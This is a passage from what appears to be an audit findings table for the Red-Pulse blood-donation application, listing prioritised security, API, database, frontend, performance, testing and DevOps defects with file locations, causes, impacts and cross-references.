| **AUTH-003** | **P1** | Security | `JwtUtils.java` | No `jti`/revocation; tokens valid to `exp` | Stateless-only design | No logout, no invalidation on compromise | — |
| **AUTH-004** | **P1** | Security | `JwtUtils.java:34-55` | 24 h access tokens | No short-TTL design | Stolen token valid a full day | AUTH-003 |
| **AUTH-005** | **P1** | Security | `AuthService.java:211-255` | No refresh rotation or reuse detection | Not implemented | 7-day replay window | AUTH-003 |
| **AUTH-006** | **P1** | Security | `AuthService.java:184-209` | `login()` skips `validateUserCanAuthenticate` | Check applied inconsistently | BLOCKED users can log in | — |
| **AUTH-007** | **P1** | Security | `AuthService.java:63-64, 275` | Reset tokens in an unbounded in-process map | No shared store | Breaks on restart/scale; memory growth; not invalidated on reset | — |
| **AUTH-008** | **P1** | Security | `AuthService.java:257-284` | No rate limit on forgot-password | No throttling | Mail bombing, map growth | SEC-005 |
| **AUTH-010** | **P1** | Security/Errors | `AuthService.java:283` | `UnconfiguredProductionEmailService` throws → 500 | No real provider | 500 becomes an account-existence oracle | DO-010 |
| **AUTH-011** | **P1** | Security | `AuthService.java:110-113` | Hospitals self-register with no verification; `licenseDocumentUrl` discarded | No approval flow | Unvetted hospital can manipulate stock | BL-007, SEC-004 |
| **AUTH-016** | **P1** | Backend | `FirebaseAdminConfig.java` | Entirely commented out → no `FirebaseAuth` bean | Feature never completed | `permitAll` endpoint permanently 500 | — |
| **SEC-005** | **P1** | Security | Global | No rate limiting anywhere | Never implemented | Credential stuffing, mail bombing, OTP brute force, DoS | — |
| **SEC-006** | **P1** | Security | `GlobalExceptionHandler.java:82-91` | Raw exception messages to clients | No error abstraction | = BE-141 | — |
| **SEC-007** | **P1** | Security/Compliance | `common/audit/*` (3 empty files) | No audit trail for stock/donation/login/role actions; IPs fabricated | Feature never implemented | Compliance claim unmet; no forensics for SEC-004 | BE-126 |
| **SEC-008** | **P1** | Security | `AdminService.java:189-231` | CSV formula injection in 7 exports | No sanitisation | Code execution on an admin's machine | — |
| **API-001** | **P1** | API/Perf | All list endpoints | Zero pagination | Never implemented | Full-table responses; DoS vector | PERF-001 |
| **API-002** | **P1** | API | Global | No versioning | — | Frontend/backend cannot deploy independently | — |
| **API-003** | **P1** | API | Global | No rate limiting | — | = SEC-005 | — |
| **API-004** | **P1** | API | Global | No idempotency | — | Duplicate records on retry/replay | — |
| **API-008** | **P1** | API/Security | `AdminController.java:42-113` | 6 of 7 CSV exports lack `Content-Disposition` | Inconsistent | Client cannot name files | — |
| **DB-001** | **P1** | Database | `V2` | No `expiry_date` / `reserved_units` on `blood_inventory` | Feature never modelled | **Blood-product expiry untracked** | BE-102, BL-003, BL-004 |
| **DB-002** | **P1** | Database | `V3` | No `units_fulfilled` on `blood_requests` | Field never modelled | **Donations never satisfy requests** | BL-005 |
| **DB-004** | **P1** | Database | All entities | No `@Version` anywhere | Never implemented | Lost updates on stock/donations | BE-105, BE-119 |
| **DB-005** | **P1** | Database/Perf | `V1` | No index on `users.phone_number` | Missed | Seq scan on the SEC-001 hot path | — |
| **FE-011** | **P1** | Frontend | `bloodRequestApi.ts:20` | `CRITICAL` urgency missing → emergencies render as "Normal" | Enum drift, no shared contract | **Urgency signal destroyed in the UI** | CQ-006 |
| **FE-013** | **P1** | Frontend | `emergencyApi.ts:19` | `ACTIVE` emergency status missing | Enum drift | Status mapping and badge colour wrong | CQ-006 |
| **FE-014** | **P1** | Frontend | `authApi.ts:169` | `INACTIVE` user status missing → shown as `ACTIVE` | Enum drift | **Misleading access-state display** | CQ-006 |
| **FE-015** | **P1** | Frontend | `notificationApi.ts:8` | 8 of 14 notification types missing | Enum drift | Badge/appointment notifications render as SYSTEM | CQ-006 |
| **FE-030** | **P1** | Frontend | `emergencyApi.ts:57` | Hardcoded `'1234567890'` contact phone | Defensive default instead of required input | **Emergency contacts are fake** | — |
| **FE-031** | **P1** | Frontend | `donorApi.ts:56,71,86` | Hardcoded `23.0225/72.5714` for donors without GPS | Same | **Corrupts all geo-matching** | BE-116, PERF-013 |
| **FE-032** | **P1** | Frontend | `hospitalApi.ts:45,57` | Fabricated `REG-{timestamp}` registration numbers | Same | Defeats uniqueness; bogus records | — |
| **FE-103** | **P1** | Frontend | `HospitalProfilePage.tsx:36` | Fabricated `REG-HP-*` prefilled into a required field | Same | Saves a fake licence number as real | — |
| **FE-104** | **P1** | Frontend | `EmergencyQuickSosModal.tsx:131` | `'Ahmedabad Trauma Center'` becomes the persisted city | Same | Wrong city on a real emergency | — |
| **FE-105** | **P1** | Frontend | `CreateBloodRequestPage.tsx:41-42` | Hardcoded `Ahmedabad`/`Gujarat` on a `@NotBlank` field | Same | Mis-attributed requests | — |
| **FE-106** | **P1** | Frontend | `DonorDashboardPage.tsx:120-134` | Eligibility fails OPEN (`!== false`); fabricated 65 kg / 25 yrs / 56 days | Missing `=== true` + hardcoded fallbacks | **Clinical gate tells donors they are eligible when unknown** | — |
| **FE-107** | **P1** | Frontend | `hospitalApi.ts:16` | Reads `isActive`; backend sends `active` → every hospital is ACTIVE | No normaliser | Suspended hospitals look live | Root Cause 2 |
| **FE-108** | **P1** | Frontend | `models.ts:264-271` | `MatchResult` fields don't exist in `DonorMatchResponse` | No normaliser | No verification badge; always BUSY; fabricated distances | Root Cause 2 |
| **FE-109** | **P1** | Frontend | `AdminDonorsPage.tsx:60,61,90,98,104` | Reads 5 non-existent fields | No normaliser | Blank names, always-OFFLINE, no badge | Root Cause 2 |
| **FE-110** | **P1** | Frontend | `models.ts:201-211` | `timestamp`/`entity` vs `createdAt`/`entityType` | No normaliser | `Invalid Date`, empty entity | FE-100 |
| **FE-040** | **P1** | Frontend/Auth | `axios.ts:96-114` + `SecurityConfig.java` | Backend 403s unauthenticated requests; the interceptor only handles 401 | No `AuthenticationEntryPoint` | **Token refresh never fires; sessions hang** | — |
| **FE-041** | **P1** | Frontend/UX | `AuthContext.tsx:24-28, 44-48` | `window.location.assign` full reload on logout/401 | No router navigation | Reloads the 1.1 MB bundle; loses state | FE-049, PERF-007 |
| **FE-112** | **P1** | Frontend/Authz | `HospitalDonationsPage.tsx:19-22` | Page calls the global `/api/donations`; no hospital scoping | No filter | Cross-tenant data exposure + unauthorised mutation | BE-104 |
| **FE-113** | **P1** | Frontend | `InventoryModal.tsx:18-33` | `defaultValues` read once; no `key`/`reset()` | Missing re-seed | Editing row B shows row A's values | — |
| **FE-115** | **P1** | Frontend | `DonorDashboardPage.tsx:61` | Renders `Welcome back, !` | `'' ?? fallback` never fires | Broken greeting on the donor home page | FE-107 |
| **FE-116** | **P1** | Frontend | `RequesterDashboardPage.tsx:169` | Fake landline shown as a hospital's real contact | Hardcoded fallback | **Users seeking blood get a wrong number** | — |
| **FE-117** | **P1** | Frontend/A11y | `ErrorPages.tsx:10-12` | `<button>` wrapping a `<Link>` with a no-op `onClick` | Invalid HTML | Screen readers mis-announce; on the 404 page | — |
| **FE-119** | **P1** | Test | `frontend.integration.test.ts:207-211` | Mock-only credentials used against the **real** backend; creates 4 real users per run | Test bypasses the mock isolation | **Corrupts a real database; the assertion cannot be true** | FE-001, PH-033 |
| **FE-122** | **P1** | Frontend/A11y | `EmergencyQuickSosModal.tsx:43-49, 163-168` | No dialog semantics/Escape/focus trap; PII persists across close→reopen | `return null` after hooks | **PII leak to the next user of the device** on the safety-critical surface | — |
| **FE-126** | **P1** | Frontend | `HospitalAppointmentsPage.tsx:39-61` | 3 mutations with no `onError` | Missing error handling | **Hospital believes a blood draw was recorded when it was not** | — |
| **FE-134** | **P1** | Frontend | `RequesterDashboardPage.tsx:31-76`; `HospitalDashboardPage.tsx:98-102` | Lifetime KPIs computed from ≤5 records; "Today's Appointments" counts all time | Missing aggregation endpoints | **Misleading operational metrics** | API-001 |
| **FE-114** | **P1** | Frontend | `AdminReportsPage.tsx:110-121`; `AdminAuditLogsPage.tsx:85-87` | "PDF" export writes CSV bytes named `.pdf` | Backend serves CSV only | Misleading downloads | API-006 |
| **FE-040b** | **P1** | Frontend | `api/emergencyApi.ts:45` | Hardcoded `contactPhone`; the UI never collects it | See FE-030 | — | — |
| **PERF-001** | **P1** | Perf | All list services | Full-table responses | No pagination | Multi-MB responses; OOM; DoS | API-001 |
| **PERF-002** | **P1** | Perf | `DonorContributionService.java:100-131` | N+1 + full scan on the **public** leaderboard | `findAll()` then per-donor query | O(N) queries | — |
| **PERF-003** | **P1** | Perf | `MatchingService.java:46-88` | Full scan + N+1 + in-Java filtering | No SQL predicate | Every match scans all donors; indexes unusable | DB-005 |
| **PERF-005** | **P1** | Perf | `AdminService.java` | `findAll()` + in-Java aggregation; CSV into a `StringBuilder` | No SQL aggregation, no streaming | ~8 full materialisations per dashboard; reports risk OOM | API-001 |
| **PERF-006** | **P1** | Perf | All `*Response.fromEntity` | N+1 on lazy relations in every mapper | No `JOIN FETCH` | ~2 extra queries per row | — |
| **PERF-007** | **P1** | Perf/Frontend | `vite.config.ts` | 1,105 kB single chunk, no code splitting | No `manualChunks`/`lazy` | 317 kB gzip blocking first paint | FE-049 |
| **PERF-004** | **P1** | Perf | `DonorContributionService` | 3–4 redundant donation queries per page load | No caching/aggregate column | Slow donor pages | DB-003 |
| **GH-003** | **P1** | Docs | — | No `README.md` | Never written | No onboarding path; undocumented first-admin bootstrap | DB-017, DO-009 |
| **GH-004** | **P1** | Legal | — | No `LICENSE` on a public remote | Absent | No legal grant | — |
| **DO-004b** | **P1** | Git | — | `mvnw`, `.mvn/`, `.gitattributes` untracked | Never added | First build needs network | DO-003 |
| **TEST-ALL** | **P1** | Testing | Backend + frontend | 16 tests; **0** on authorization, OTP, business logic, controllers, migrations, API adapters, interceptors, `AuthContext`; no E2E; no coverage tooling | Never built out | **Every P0/P1 above is undetected by the suite** | BE-001, BE-002 |
| **CQ-006** | **P2** | Quality | 6 adapters | Blood-group array copy-pasted 8×; the direct cause of FE-011/013/014/015 | No shared constant | **Root cause of 4 P1 bugs** | — |
| **BE-112** | **P2** | Quality | `AuthService.java:151-176, 324-355` | Donor validation duplicated | Copy-paste | Two clinical rule copies | — |
| **BE-114** | **P2** | Backend | `AuthService.java:170` | Gender stored raw, validated upper-cased | Mismatch | Unreliable gender grouping | — |
| **BE-116** | **P2** | Backend | `MatchingService.java:41-44` | Hardcoded `23.0225/72.5714` fallback origin | Magic constants | Hospitals without GPS match against Ahmedabad | FE-031 |
| **BE-117** | **P2** | Backend | `MatchingService.java:60-88` | Matching ignores donor eligibility | Missing rule | Ineligible donors ranked | BE-107 |
| **BE-118** | **P2** | Backend | `InventoryService.java:92-108` | `action` unvalidated; `default → SET` | No enum constraint | **Silent stock overwrite on a typo** | API-011 |
| **BE-119** | **P2** | Backend | `InventoryService.java:76-88` | Read-modify-write, no lock | No `@Version` | Lost increments | DB-004 |
| **BE-121** | **P2** | Backend | `InventoryService.java:122-126` | `validateHospital` ignores `is_active` | Soft-delete not respected | Deleted hospitals stay writable | — |
| **BE-122** | **P2** | Backend | `DonorContributionService.java:101-131` | `getStatistics` counts all donations; summary counts only COMPLETED | Inconsistency | Two totals on one screen | — |
| **BE-123** | **P2** | Backend | `DonorContributionService:126`, `AdminService:180`, `MatchingService:66` | `getBloodGroup().name()` with no null guard vs DDL `NOT NULL` | Inconsistent null handling | NPE → 500 on leaderboard/admin/analytics | DB-008 |
| **BE-124** | **P2** | Backend | `AdminService.java:238-244` | All donors reported eligible | Placeholder | Misleads compliance officers | FE-109 |
| **BE-125** | **P2** | Backend | `AdminService.java:246-252` | Admin can block self/last admin | Missing guard | Irreversible lockout | — |
| **BE-126** | **P2** | Backend | `AdminService.java:96-101` | Audit IP hardcoded `127.0.0.1` | Placeholder | **Audit IPs fabricated** | SEC-007 |
| **BE-128** | **P2** | Backend | `NotificationService.java:71-76` | `sendNotification` silently no-ops | Design | Invisible notification loss | — |
| **BE-145** | **P2** | Errors | `EmergencyEmailOtpService.java:104-115` | Mail failure → 400 | Wrong status | Masks an SMTP outage as a user error | — |
| **BE-146** | **P2** | API | `InventoryController.java:79` | `List<Object>` return | Untyped | No contract | — |
| **BE-147** | **P2** | API | `AuthController.java:72, 82` | Text responses on 2 endpoints | Inconsistency | Breaks the client error contract | FE-010 |
| **BE-148** | **P2** | API | `EmergencyOtpController.java:68-72` | 200-with-`success:false` vs 400 for the same error class | Inconsistent semantics | Callers must inspect the body | — |
| **BE-151** | **P2** | Architecture | `DonorContributionController.java:27` | Controller injects a repository | Layering violation | Bypasses the service layer | — |
| **BE-152** | **P2** | Architecture | 3 patterns | Authorization expressed 3 different ways | No single policy location | **Root cause of the 33-endpoint gap** | Root Cause 1 |
| **BE-153** | **P2** | API | `MatchingController.java:25,34,43` | 3 endpoints returning identical results | Copy-paste | API surface inflation | — |
| **BE-154** | **P2** | Quality | `AdminService.java` | 250 lines mixing 5 concerns | No separation | Unmaintainable | — |
| **BE-155** | **P2** | Quality | `UserProfileService.calculateEligibility` | 4 magic constants (18, 65, 50, 90) inline | Magic numbers | Undocumented clinical thresholds | BE-106 |
| **BE-156** | **P2** | Quality | `AdminService.getAllUsers` | In-Java `contains()` filtering | No Specification | Unusable at scale | PERF-008 |
| **DB-003** | **P2** | Database | `donor_profiles` | No `total_donations` | Never modelled | Recomputed by scan | PERF-004 |
| **DB-006** | **P2** | Database | `V4`, `V5` | Missing indexes on 3 FK/lookup columns | Missed | Seq scans in hot paths | — |
| **DB-007** | **P2** | Database | `V4:38` | DDL default COMPLETED vs entity SCHEDULED | Two sources of truth | Phantom completions on raw inserts | BE-111 |
| **DB-008** | **P2** | Database | `V2` vs `DonorProfile.java` | `blood_group` NOT NULL in DDL, nullable in entity | Two sources of truth | NPE risk | BE-123 |
| **DB-009** | **P2** | Database | `V2`,`V3`,`V4` | Hospital delete cascades to appointments/donations/inventory | FK graph | Silent clinical-record loss if ever hard-deleted | — |
| **DB-010** | **P2** | Database | `V1`–`V5` | No CHECK on enum columns | App-layer integrity only | Bad inserts → 500s | — |
| **DB-011** | **P2** | Database | `V6` | 0-byte migration | Dropped migration | Contributes to BE-003 | — |
| **DB-012** | **P2** | Database | `V9` | `IF NOT EXISTS` in versioned migrations | Anti-pattern | Masks schema drift | — |
| **DB-013** | **P2** | Database/Privacy | 3 tables | No retention/cleanup job | Never implemented | Unbounded growth; retains bcrypt hashes + IPs | — |
| **BE-004** | **P2** | Deps | `pom.xml:68-70` | springdoc 2.8.13 (Boot 3 line) on Boot 4.1.1 | Version-line mismatch | Unverified support | — |
| **BE-005** | **P2** | Config | `application-{dev,prod}.yml` | Both 0 bytes | Never authored | Prod behaviour is ad-hoc `@Profile` | DO-010 |
| **BE-007** | **P2** | Test | `pom.xml` | Mockito self-attaching | Not registered as an agent | Future-JDK breakage | — |
| **BE-009/DO-009** | **P2** | Config | `.env.example:14` | `JWT_SECRET` placeholder is not valid base64 for HS256 | Placeholder not validated | Documented setup path crashes at startup | — |
| **BE-132/DO-011** | **P3** | Config | `RedPulseApplication.java:21-40` | Hand-rolled `.env` → System properties, duplicating `spring.config.import` | Redundancy | CWD-dependent, silently failing | BE-001 |
| **BE-133** | **P3** | DevOps | `SwaggerAutoOpen.java` | Opens a browser in every profile; `System.out/err` | Missing `@Profile("dev")` | Production log noise | SEC-013 |
| **BE-134** | **P3** | DB | `GlobalExceptionHandler`, all entities | `LocalDateTime.now()` with no zone | No UTC discipline | Ambiguous audit timestamps | DB-015 |
| **DB-014** | **P3** | Database | All `updated_at` | No DB trigger | JPA-managed only | Stale on out-of-band writes | — |
| **DB-015** | **P3** | Database | All timestamps | `TIMESTAMP` without time zone | No UTC discipline | Ambiguous across regions | — |
| **DB-016** | **P3** | Docs/DB | `V3` | `blood_request_id NOT NULL` vs spec "optional" | Doc/impl mismatch | — | — |
| **DB-017** | **P3** | DevOps | `DataInitializer.java` | No seed data; no documented first-admin path | Bootstrap optional + undocumented | Fresh env has no admin | — |
| **API-005/SEC-013** | **P2** | Security | `SecurityConfig.java:58-61` | Swagger/OpenAPI `permitAll` in all profiles | No profile guard | Full API disclosure in prod | — |
| **API-006** | **P2** | API | `AdminController.java` | 6 of 7 exports lack `Content-Disposition`; no charset | Inconsistent | Client cannot name files | FE-114 |
| **API-007** | **P2** | API | `AdminService.java` | CSV with no escaping (6 of 7) | `String.format` | Corrupted reports | SEC-008 |
| **API-009** | **P2** | API | `BloodRequestCreateRequest.java:19` | `unitsRequired` has no `@Max` | Missing bound | 2M-unit requests via direct API | — |
| **API-010** | **P2** | API | `DonationCreateRequest.java:24` | `quantityUnits` has no `@Max` | Missing bound | Unbounded inventory inflation | — |
| **API-011** | **P2** | API | `StockUpdateRequest.java:15` | `action` unvalidated | No enum constraint | BE-118 | — |
| **API-012** | **P2** | API | `EmergencyRequestCreateRequest.java:16` | `emergencyLevel` is a `String`, not an enum | Inconsistent modelling | Typo-prone | — |
| **API-013** | **P2** | API | `NotificationRepository.java:22-25` | `@Modifying` JPQL with no `clearAutomatically` | Missing transaction config | Stale reads | — |
| **API-017** | **P2** | API | 3 adapters | Client sends fields the server does not define | No shared contract | Relies on Jackson leniency | CQ-006 |
| **AUTH-012** | **P2** | Security | `CustomUserDetailsService.java:23-28` | Email embedded in the exception message | Message content | Enumeration oracle if it escapes | AUTH-006 |
| **AUTH-013** | **P2** | DevOps/Security | `CorsConfig.java:19-21` | CORS hardcoded to `localhost:5173` | No prod config | Deployed frontend blocked | DO-007 |
| **AUTH-014** | **P2** | Quality | `SecurityUtils.java` | 4 of 6 methods unused | Misleading abstraction | Hides the real ad-hoc auth patterns | BE-152 |
| **AUTH-015** | — | Security | `SecurityConfig.java:35` | CSRF disabled | **Justified** for stateless Bearer + no cookies. Not scored. Becomes a real risk if tokens move to cookies without CSRF tokens | — | SEC-010 |
| **AUTH-017** | **P2** | Backend | `FirebasePhoneAuthService.java:82-93` | Auto-provisions a DONOR with no `DonorProfile` | Incomplete provisioning | Invisible to matching until self-registration | AUTH-016 |
| **SEC-009** | **P2** | Security | `.env:11,15,25-27` (masked) | Real DB password and a working JWT secret on disk | Local dev file | Secret exposure if committed; weak-key risk if reused | BE-009 |
| **SEC-010** | **P2** | Security | `axios.ts:20-56` | Tokens in `localStorage`, no CSP | Standard SPA trade-off + missing CSP | XSS → 7-day takeover | SEC-002, SEC-011 |
| **SEC-011** | **P2** | Security | `SecurityConfig.java` | No CSP / referrer-policy / permissions-policy (Spring defaults cover nosniff/frame/HSTS) | Not configured | No injection defence-in-depth | SEC-010 |
| **SEC-012** | **P2** | Security | `EmergencyEmailOtpService.java:70-77` | `getRemoteAddr()` with no forwarded-header handling | No `forward-headers-strategy` | Rate limit collapses or is spoofable | SEC-005 |
| **CQ-001** | **P2** | Quality | `UserService` vs `UserProfileService` | ~200 duplicated lines, divergent rules | Copy-paste | Undefined business rule | = BE-106 |
| **CQ-002** | **P2** | Quality | `AuthService:151-176, 324-355` | Donor validation duplicated | Copy-paste | Two clinical rule copies | = BE-112 |
| **CQ-003** | **P2** | Quality | 4 locations | Four inconsistent badge/rank taxonomies | Copy-paste | Inconsistent donor rewards | BE-108 |
| **CQ-004** | **P2** | Quality | 3 locations | `units * 3` lives-saved constant | Magic number | Undocumented domain constant | FE-135 |
| **CQ-005** | **P2** | Quality | 8 adapters + `contributionApi` | Pagination unwrapping re-implemented 9× | Copy-paste | Inconsistent normalisation | FE-125 |
| **CQ-007** | **P2** | Quality | 5 locations | Magic coordinates | Magic constants | Geo bugs | FE-031, BE-116 |
| **CQ-008** | **P3** | Quality | 4 × `*NotificationsPage.tsx` | Byte-identical duplicates (~440 lines) | Copy-paste | Fixes must be applied 4× | — |
| **FE-017** | **P2** | Frontend/API | `hospitalApi.ts:47,57` | Sends `registrationNumber`; server ignores it | Contract drift | Silent no-op | — |
| **FE-018** | **P2** | Frontend/API | `contributionApi.ts:118` | `totalUnits` does not exist server-side | Contract drift | Leaderboard column always 0 | — |
| **FE-019** | **P2** | Frontend/API | `reportApi.ts`, `schemas:139-147` | 6 filters + PDF accepted; server takes no params | Contract drift | **All admin report filters silently ignored** | API-001 |
| **FE-020** | **P2** | Frontend | `schemas/index.ts:7` | Login password `min(8)`; server has none | Stricter client rule | Legacy short-password accounts locked out | — |
| **FE-021** | **P2** | Frontend | `schemas:50-56` vs `UserProfileService` | Weight 45 (FE) vs 50 (BE) | Divergent thresholds | False eligibility promises | BE-106 |
| **FE-022** | **P2** | Frontend/API | `httpHelpers.ts:36-52` | Cosmetic pagination; params ignored | No server support | Every list is a full table | API-001, PH-004 |
| **FE-023** | **P2** | Frontend | `contributionApi.ts:76-86` | Milestone progress fabricated from booleans | Missing server data | Invented numbers in the UI | — |
| **FE-025** | **P3** | Frontend | `api/typed.ts:30` | `asEnumValue` degrades silently | Design | The mechanism behind 4 enum-drift P1s | CQ-006 |
| **FE-028** | **P2** | Frontend | ~10 pages | `useQuery`'s `error` destructured nowhere | Missing error wiring | Failures render as "no data" | FE-055 |
| **FE-029** | **P2** | Frontend | `HospitalDashboardPage:17-24` + 4 siblings | Bare `catch` swallows 401/403/500 | Missing error discrimination | Revoked role → permanently empty page | — |
| **FE-033** | **P2** | Frontend | `emergencyApi.ts:39-41` | `requiredBy` silently set to tomorrow | Defensive default | Wrong deadline | — |
| **FE-034** | **P2** | Frontend | `emergencyApi.ts:29-30` | Always-true `if (!bloodRequestId)` | Vestigial | Signals unreviewed logic | — |
| **FE-035** | **P2** | Frontend/DevOps | `mocks/index.ts:419-421` | Mock tokens; `.env.example` ships `VITE_USE_MOCK_API=true` | No build-time guard | Risk of shipping a fixture-backed build | — |
| **FE-042** | **P2** | Frontend | `AuthContext.tsx:31,57,66` | Hardcoded storage keys instead of `STORAGE_KEYS` | Duplication | Key drift → "session lost" | — |
| **FE-043** | **P2** | Frontend | `axios.ts:104-106` | 401 handler fires on failed login | Missing exclusion | Full reload on a password typo | FE-041 |
| **FE-044** | **P2** | Frontend | `axios.ts:63-66` | No request timeout | Not configured | Infinite spinners; no cancellation | — |
| **FE-045** | **P2** | Frontend/Security | `errors.ts:26-33` | Renders the backend's raw message | Trusts the server | Info-leak chain | SEC-006 |
| **FE-046** | **P2** | Frontend | `reportApi.ts:15`, `adminApi.ts:19` | Blob error responses unhandled | Not handled | Opaque errors on report failure | — |
| **FE-047** | **P2** | Frontend | `useListParams.ts:12,20-25` | Stale closure on `params`; `draft` not resynced | Closure/state bug | Filter state silently lost | — |
| **FE-048** | **P2** | Frontend | `ProtectedRoute.tsx:10` | `state.from` never consumed | Unimplemented | Deep links lost on login | — |
| **FE-049** | **P2** | Frontend/Perf | `AppRoutes.tsx` | No `React.lazy` | Not implemented | 1,105 kB bundle | PERF-007 |
| **FE-050** | **P3** | Frontend | `utils/debounce.ts` | No `.cancel()` | Missing API | SetState-after-unmount risk (dead export) | — |
| **FE-051** | **P3** | Frontend | `utils/format.ts:5,12,19` | `new Date('YYYY-MM-DD')` = UTC midnight | Standard pitfall | Off-by-one day outside IST (dead export) | FE-142 |
| **FE-052** | **P3** | Frontend | `constants/env.ts:2` | `??` instead of `||` for the API base URL | Wrong operator | `VITE_API_BASE_URL=` → `baseURL: ''` | DO-007 |
| **FE-053** | **P3** | Frontend | `index.html:10-14` | Third-party font CDN; no CSP | Not configured | Privacy + no injection defence | SEC-010, SEC-011 |
| **FE-060** | **P2** | Frontend | `constants/blood.ts:41` | Mojibake `hospital�?Ts` | Encoding corruption | Visible on a public page | GH-010 |
| **FE-061** | **P2** | Frontend | `utils/format.ts:5,12,19` | Mojibake `'�?"'` (×3) | Encoding corruption | Visible placeholders | GH-010 |
| **FE-062** | **P2** | Backend+FE | `DonorContributionService.java:110-111` | Mojibake `dY��` badge prefixes | Encoding corruption | Visible in the leaderboard | GH-010 |
| **FE-111** | **P2** | Frontend/API | `hospitalApi.ts:60-63` | `bloodRequests` skips normalisation but is typed `PageResponse<BloodRequest>` | No normaliser | "Required Date" always `—`; the type lies | Root Cause 2 |
| **FE-120** | **P2** | Frontend/A11y | 9 sites | `<Select label="">` → no accessible name | Missing label | Filter controls unlabelled for screen readers | PH-039 |
| **FE-121** | **P2** | Frontend/A11y | `DonorDashboardPage.tsx:66-78` | Availability toggle unlabelled, colour-only | Correct `Switch` exists but is unused | Donor cannot know their state; screen readers get nothing | PH-039 |
| **FE-130** | **P2** | Frontend | `DonorProfilePage:24-33`; `HospitalProfilePage:34-42` | `useForm({values})` re-seeds from hardcoded clinical fallbacks | Defensive defaults | **Writes 65 kg / MALE / 1998-01-01 as real data**; discards in-progress edits | FE-106 |
| **FE-131** | **P2** | Frontend | `schemas/index.ts:22-25, 53-63`; `AuthPages.tsx:124` | Schema looser than the UI labels; errors never displayed | Schema drift | "Must be 18+" is not enforced; failures show no message | — |
| **FE-132** | **P2** | Frontend | `AuthPages.tsx:104-111` | Licence upload is a no-op with a green "success" chip | Not implemented | Hospital admins believe accreditation was submitted | BL-007 |
| **FE-133** | **P2** | Frontend | `ContentPages.tsx:135-148` | Contact form fires `toast.success` with no API call | Not implemented | Fake success on a public page | — |
| **FE-136** | **P2** | Frontend/A11y | `Fields.tsx:24-28, 42, 56, 69` | Errors not associated with inputs | Missing `aria-invalid`/`aria-describedby` | Screen readers get unlinked announcements | — |
| **FE-137** | **P3** | Quality | 22 sites | Dead exports (7 are a11y primitives) | Never wired | Repo noise; explains FE-120/121 | — |
| **FE-138** | **P3** | Quality | `Switch` (`Fields.tsx:157`) | Uses `left-5.5`, a non-existent Tailwind token | Not a real token | Knob transition would not apply | FE-121 |
| **FE-139** | **P3** | Routing | `AppRoutes.tsx:146,168` | 2 routed pages unreachable; bell icon hidden | Missing nav entries | Two complete pages are dead | — |
| **FE-140** | **P3** | Quality | 4 pages | Destructive delete has no `ConfirmDialog`, no `type`/`disabled` | Inconsistency | Accidental deletion | — |
| **FE-141** | **P3** | Frontend | `RequesterRequestDetailPage:127`; `FindDonorsPage:69` | `matchScore` renders `"undefined%"` | Missing fallback | Visible defect | FE-108 |
| **FE-142** | **P3** | Frontend | 10+ pages | Unguarded `new Date(...)` → `"Invalid Date"`; correct helpers exist unused | Helpers not used | Broken dates across the app | FE-137 |
| **FE-143** | **P3** | Frontend | `DonorContributionsPage.tsx:97` | Milestone bar divides by `target` with no zero guard | Missing guard | `width: NaN%` | — |
| **FE-144** | **P3** | Frontend | 4 pages | `Promise.reject()` with no reason | Missing error | Unhandled rejections with no message | — |
| **FE-145** | **P3** | Deps | `package.json:33` | `@testing-library/user-event` declared, never used | Never adopted | Remove or adopt | — |
| **FE-146** | **P2/P3** | Frontend/A11y | 9 sites | Filter `Input`s named only by `placeholder` | Missing `label` | Below the accessible-name bar | — |
| **FE-001** | **P2** | Test/Build | `package.json:12` | Broken `test:integration` script | Shell glob + vitest filter | Integration suite unreachable | FE-119, PH-033 |
| **FE-002** | **P2** | Perf/Build | `vite.config.ts` | No build tuning | Default config | 1,105 kB chunk | PERF-007 |
| **GH-005** | **P2** | Git | `Red-Pulse Backend/red-pulse/package.json` | Stray npm manifest in a Maven module | Leftover | Install confusion | — |
| **GH-006** | **P2** | Git | `src/assets/*` | 3 unused tracked assets | Template leftovers | Repo noise | — |
| **GH-008** | **P2** | Git | root `.gitignore` | Backend ignore rules are themselves untracked | Not yet in force | Backend could be committed with `target/` | GH-001 |
| **GH-009** | **P3** | Git | remote URL | Repo name `red-pulse-` (trailing hyphen) | Typo | Persists in clone URLs | — |
| **GH-010** | **P3** | Git | `blood.ts:41`, `format.ts:5,12,19` | Mojibake committed; no root `.gitattributes`/`.editorconfig` | Encoding | Corruption recurs | FE-060/061/062 |
| **GH-011** | **P3** | Git | backend `.gitattributes` | Inconsistent line endings | Partial | Diff noise | — |
| **DO-009** | **P2** | DevOps | `.env.example:14` | Invalid `JWT_SECRET` placeholder | Not validated | Documented setup crashes | BE-009 |
| **DO-011** | **P2** | DevOps | `RedPulseApplication.java:21-40` | Hand-rolled `.env` parser duplicating `spring.config.import` | Redundancy | CWD-dependent, silently failing | BE-001 |
| **DO-012** | **P2** | DevOps | `application.yml` | No `server.shutdown` / graceful drain | Not configured | In-flight work dropped on deploy | — |
| **DO-014** | **P2** | DevOps | — | No backup/restore/rollback plan | Never created | Unrecoverable data loss | — |
| **DO-015** | **P2** | DevOps | `SwaggerAutoOpen.java`, `SecurityConfig.java` | Swagger opens in prod; API docs public | No profile guard | — | SEC-013, BE-133 |
| **DO-016** | **P2** | Quality | — | No `.editorconfig`, formatter, or pre-commit hook | Never created | Inconsistent formatting; corruption recurs | GH-010 |
| **DO-017** | **P3** | DevOps | `package.json` | No `packageManager`/`engines`/`.nvmrc` | Not pinned | Non-reproducible builds | — |
| **DO-018** | **P3** | DevOps | `mvnw`, `.mvn/` | Wrapper untracked; needs a network download | Uncommitted | First build needs internet | DO-003 |
| **DO-019** | **P3** | Git | backend `.gitignore` | Ignores `HELP.md` | Unreviewed ignore file | — | — |
| **DO-020** | **P3** | Frontend | `index.html:10-14` | Third-party font CDN | Not self-hosted | Availability + privacy dependency | FE-053 |
| **PERF-008** | **P2** | Perf | `AdminService.java:206-224` | `findAll()` + in-Java filtering | No `Specification` | O(n) per request | API-001 |
| **PERF-009** | **P2** | Perf | `AuthService.java:63` | Unbounded in-memory reset-token map | No eviction | Heap growth under abuse | AUTH-007 |
| **PERF-010** | **P2** | Perf | `AppointmentReminderService.java:24-38` | N+1 inside one transaction | No `JOIN FETCH` | Hourly load; long transaction | — |
| **PERF-011** | **P2** | Quality | `HospitalController.java:22-24` | Unused imports hinting at an abandoned pagination layer | Vestigial | Signals PERF-001 | — |
| **PERF-012** | **P3** | Perf/Frontend | `main.tsx:14-20` | 5-min `staleTime`, no focus refetch | Over-aggressive cache | Stale blood counts for 5 min | — |
